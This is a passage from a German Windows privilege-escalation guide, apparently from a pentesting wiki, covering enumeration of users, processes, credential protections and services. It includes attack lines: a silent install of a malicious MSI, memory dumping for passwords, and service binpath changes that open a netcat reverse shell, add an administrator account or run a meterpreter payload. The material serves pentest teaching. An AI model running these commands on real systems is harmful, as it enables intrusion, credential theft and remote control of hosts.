  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

So führst du die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du ihnen Beachtung schenken

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorpasswörter** und stellt sicher, dass jedes Passwort auf in eine Domäne eingebundenen Computern **eindeutig, zufällig generiert und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern mit ausreichenden Berechtigungen über ACLs abgerufen werden. Dadurch können sie autorisierte Benutzer einsehen.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn WDigest aktiv ist, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System zusätzlich abzusichern.\
[**Weitere Informationen zu LSA Protection finden Sie hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie pass-the-hash attacks schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden normalerweise Domänenanmeldedaten für diesen Benutzer eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen enumerieren

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **Mitglied einer privilegierten Gruppe bist, kannst du möglicherweise deine Privilegien erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um deine Privilegien zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** und deren Missbrauch zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Benutzerordner

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Passwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe zunächst beim Auflisten der Prozesse **die Befehlszeile der Prozesse auf Passwörter**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben kannst** oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) laufen. Du könntest sie zur Rechteausweitung missbrauchen.

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portübersicht nicht auftaucht, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, dem Prozessbesitzer und der Frage zu, ob der Benutzer mit geringeren Rechten ihn erreichen kann. Ein Anwendungsname oder ein Debug-Flag allein belegt keine Codeausführung über Benutzergrenzen hinweg. Beschränke die routinemäßige Erkundung auf passive Methoden, statt Debugger-Befehle zu senden.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem in der mit `snort.exe -c <config>` ausgewählten Konfiguration deklarierten `dynamicpreprocessor directory` laden. Wenn eine geplante Aufgabe oder ein Dienst Snort unter einem anderen Konto ausführt, prüfe genau diese Konfiguration und die ACL des deklarierten Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, sollte der Pfad daraufhin geprüft werden, ob er Code execution ermöglicht, wenn die Aufgabe oder der Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Ausführungskontos, die aktive Konfiguration, die Modulkompatibilität sowie etwaige Deny- oder Freigabeeinschränkungen; ein beschreibbares Verzeichnis allein belegt keine Privilegienausweitung. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem DocumentRoot

Vergleiche bei einer Windows-Apache-Installation den ausführbaren Pfad und das Ausführungskonto des Dienstes mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem herkömmlichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des darin konfigurierten DocumentRoot, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen Dateien in diesem Verzeichnis erstellen kann, während Apache als `LocalSystem` läuft, kann serverseitige Code execution die Privilegiengrenze des Hosts überschreiten. Stelle sicher, dass der Dienst ausgeführt wird, der genaue Pfad bereitgestellt wird und ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis allein belegt nur die Möglichkeit, Dateien zu erstellen. Prüfe ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation kann der Dienst auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`) verweisen. Die Konfiguration liegt daneben unter `conf\httpd.conf`, und das Standard-Root-Verzeichnis ist `C:\wamp64\www` oder `C:\wamp\www`. Prüfe gemeinsam das genaue Dienst-Image, die Identität, unter der der Dienst ausgeführt wird, das effektive `DocumentRoot` (einschließlich der Expansion von `${INSTALL_DIR}` und Virtual-Host-Überschreibungen) und die ACL des Root-Verzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt nicht, dass Apache als `SYSTEM` läuft oder die eingereichte Datei ausführt. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Root-Verzeichnis und Netzwerkidentität des Anwendungspools

Ordne bei IIS ein beschreibbares physisches Verzeichnis einer **aktiven Website/Anwendung** in `applicationHost.config` zu und ermittle den konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfe die effektiven Dateierstellungsrechte des aktuellen Benutzers, den Laufzeitstatus der Website, den Handler und pfadspezifische Überschreibungen, bevor du ein beschreibbares Verzeichnis als Codeausführung einstufst.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig befindet sich dieses Verzeichnis unter dem entsprechenden .NET-Framework-Installationsverzeichnis in einem Ordner namens `Temporary ASP.NET Files`; `<compilation tempDirectory>` in der Anwendung kann diesen Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse voneinander zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Wenn ein Token mit niedrigeren Rechten generierten Quellcode im Cache der **konkreten** Anwendung ändern kann, stelle fest, ob diese Anwendung ihn unter einer privilegierteren [Workerprozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) neu kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Ordne den Cache der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer etwaigen Neukompilierung zu. Verwende eine schreibgeschützte Prüfung der Metadaten; löse während der Bestandsaufnahme keine Kompilierung aus und ändere keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen üblicherweise als **Computerkonto des Hosts**, obwohl sein lokales Token nur geringe Rechte haben kann. `LocalSystem` verfügt lokal bereits über hohe Rechte und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` tritt im Netzwerk normalerweise mit anonymen Anmeldedaten auf. Ein `SpecificUser`-Pool verwendet stattdessen das konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität des Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Standardwerte des Pools übernehmen, die sich je nach IIS-Generation unterscheiden. Ermittle daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Wenn Codeausführung einen Pool mit Netzwerkidentität des Computerkontos erreicht, prüfe die Verzeichnisrechte **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Namenskontext der Domäne; ein Ticket des Computerkontos oder die Hostrolle allein belegt diese Rechte nicht. Die passive Bestandsaufnahme sollte Konfiguration und ACLs prüfen, ohne eine Datei hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, verfolge jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann es ermöglichen, dass Shell-Metazeichen den Befehl ändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stelle fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermittle anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des Kindprozesses. Eine lesbare Quellcodezeile, ein Listener auf localhost oder eine Schwäche im Token-Format belegt für sich genommen keine privilegierte Befehlsausführung. Prüfe Quellcode und Poolkonfiguration, ohne während der passiven Bestandsaufnahme gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein anfragegesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine von einem Benutzer mit niedrigeren Rechten beschreibbare PHP-Datei mit der Identität des Workerprozesses ausführen. Bestätige, dass die Anfrage die betreffende Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit niedrigeren Rechten ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Einbinden erlauben und der Worker tatsächlich mit höheren Rechten läuft. Ein Listener auf Loopback oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfe Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während der passiven Bestandsaufnahme aufzurufen.

### Passwortsuche im Arbeitsspeicher

Mit **procdump** von Sysinternals kannst du einen Speicherabbild eines laufenden Prozesses erstellen. Dienste wie FTP halten **Anmeldedaten im Klartext im Arbeitsspeicher**; versuche, den Speicher auszulesen und die Anmeldedaten zu lesen.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem für Benutzer mit niedrigeren Rechten beschreibbaren Drop-Verzeichnis öffnet, überschreitet unter dem Konto des Importers eine Eingabe-Vertrauensgrenze. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder Task, der ihn öffnet, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte XML External Entities in Projektmetadaten; eine Netzwerk-Entität unter Windows könnte eine Authentifizierung durch das importierende Konto auslösen, wenn [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zulassen. Das ist ein Hinweis auf mögliche Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei passiver Enumeration kein präpariertes Projekt; untersuchen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) des Service Control Manager (SCM)-Objekts ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche, schreibgeschützte [`OpenSCManager`-Zugriffsanfrage](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, aber kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das die bei der Erstellung angeforderten Dienstzugriffsrechte besitzt; beim späteren erneuten Öffnen des Dienstes erfolgt eine separate Zugriffskontrolle, die fehlschlagen kann, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie jeweils separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Start-Richtlinie und den ausführbaren Pfad. Erstellen oder starten Sie bei passiver Enumeration keinen Dienst.

Bei einem Remote-Pfad zur Dienstinstallation müssen diese SCM-Rechte mit einer Freigabe auf dem Zielsystem abgeglichen werden, in die **dieselbe Netzwerkanmeldung** schreiben kann, ebenso mit deren zugrunde liegender NTFS-ACL und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Nicht-Administrator-Konto kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und der Dateibereitstellungspfad beide vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht zum Erstellen eines Dienstes im SCM allein belegt nicht, dass der neue Dienst unter einer höher privilegierten Identität gestartet werden kann.

Ein bestehender Dienst kann beim Start, Herunterfahren oder einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, selbst wenn diese nicht in seinem `ImagePath` aufgeführt ist. Wird der Name der Hilfsdatei in ein für Benutzer mit niedrigeren Rechten beschreibbares Verzeichnis aufgelöst und läuft der Dienst unter einer höher privilegierten Identität, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Berechtigungen zum Erstellen von Verzeichnissen, die Dienstidentität und einen verfügbaren Lebenszyklus-Trigger. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; passive Prüfung sollte den Dienst weder starten noch stoppen.

Bei einem bestehenden Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) getrennt. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht bewerten. Wenn ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet wird, prüfen Sie die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Verbraucher oder Loader diese Datei akzeptiert; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Bei der passiven Bestandsaufnahme sollte der Dienst weder gestartet noch eine Testdatei erstellt werden.

Bei einem NSClient++-Überwachungsagenten ist eine lesbare `nsclient.ini` ein **Hinweis für eine Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und einen Trigger, der ihn unter der Dienstidentität ausführt. Ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer dennoch erreichbar sein, aber der Dateipfad, das Passwort oder der Listener allein belegen nicht, dass diese Rechte vorliegen. Prüfen Sie Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder bei der passiven Enumeration die Web-API aufzurufen. Siehe das [Dateilayout von NSClient++](https://nsclient.org/docs/concepts/file-layout/), die [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und die [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` dessen konfiguriertes Arbeitsverzeichnis ist. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als vollständige Dienstgrenze betrachten. Ein vom untergeordneten Prozess bereitgestellter lokaler WCF- oder SOAP-Endpunkt ist ein separater Prüfhinweis: Bestätigen Sie, dass der Listener für den Benutzer mit niedrigeren Rechten erreichbar ist, der genaue Vorgang dessen Eingaben akzeptiert und der untergeordnete Dienstprozess den unsicheren Vorgang unter einer höher privilegierten Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweisen keine Rechteausweitung; rufen Sie bei passiver Enumeration keine Dienstvorgänge auf.

Verfolgen Sie bei einem benutzerdefinierten WCF-Vorgang, ob eine vom Aufrufer kontrollierte Zeichenfolge in einen PowerShell-Runspace gelangt. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ein [`netTcpBinding` mit Windows-Transportanmeldeinformationen](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client; die Berechtigung zum Aufrufen dieses **konkreten** Vorgangs und die effektive Identität des Runspaces müssen jedoch separat geprüft werden. Ein Pfad von einer Eingabe eines Aufrufers mit niedrigeren Rechten zu `AddScript` unter einer höher privilegierten Dienstidentität stellt eine Codeausführungsgrenze dar; ein lauschender Port, ein authentifizierter Client oder eine nicht verwendete Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Impersonation-Einstellungen statisch, ohne den Endpunkt während der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Selbst ohne SERVICE_START-Rechte können Sie häufig privilegierte Dienste starten, indem Sie ihre Trigger auslösen. Hier finden Sie Techniken zur Enumeration und Aktivierung:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-Dienst für Diagnosesammler

Visual-Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der für die Ausführung als `LocalSystem` konfiguriert ist. Bei [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wurde eine Race Condition mit einer Junction und einem Object-Manager-Link verwendet, um eine DACL-Zurücksetzung des Dienstes umzuleiten. Die demonstrierte Rechteausweitung erforderte außerdem einen nutzbaren MSI-Reparaturpfad des Visual Studio Setup WMI Providers und dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Die Komponente wurde im Januar 2024 korrigiert.

Prüfen Sie bei der passiven Triage das Konto und den Binärpfad dieses Dienstes, ob der Pfad zum Setup-WMI-Compiler vorhanden ist und den Patch-Status der installierten Komponente. Ein Diensteintrag, die Produktversion von Visual Studio oder eine Compilerdatei allein belegen nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Rufen Sie eine Liste der Dienste ab:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Du kannst **sc** verwenden, um Informationen zu einem Dienst abzurufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Hier kannst du accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, weil er entweder deaktiviert ist oder ihm keine aktivierten Geräte zugeordnet sind._

Du kannst ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachte, dass der Dienst upnphost von SSDPSRV abhängt, damit er funktioniert (für XP SP1)**

**Eine weitere Problemumgehung** für dieses Problem ist die Ausführung von:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated users“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So ändern und führen Sie **sc** aus:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können über verschiedene Rechte erweitert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern von Dienstkonfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder unter einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit niedrigen Berechtigungen die Dienst-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Dienst häufig kapern, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Dienst ausgeführten Binärdateien ermitteln und deine Berechtigungen mit **icacls** überprüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Suche nach gefährlichen ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Service-Executable oder das Verzeichnis, in dem sie sich befindet. Ein praktischer Angriffsablauf ist:<sup>[[27]](#references)</sup>

1. Ermittle das Servicekonto und den Pfad zur Executable mit `sc qc <service_name>`.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Service-Binärdatei durch ein Payload oder eine gültige, bösartige Service-Binärdatei.
4. Starte den Service mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / Service-Trigger).

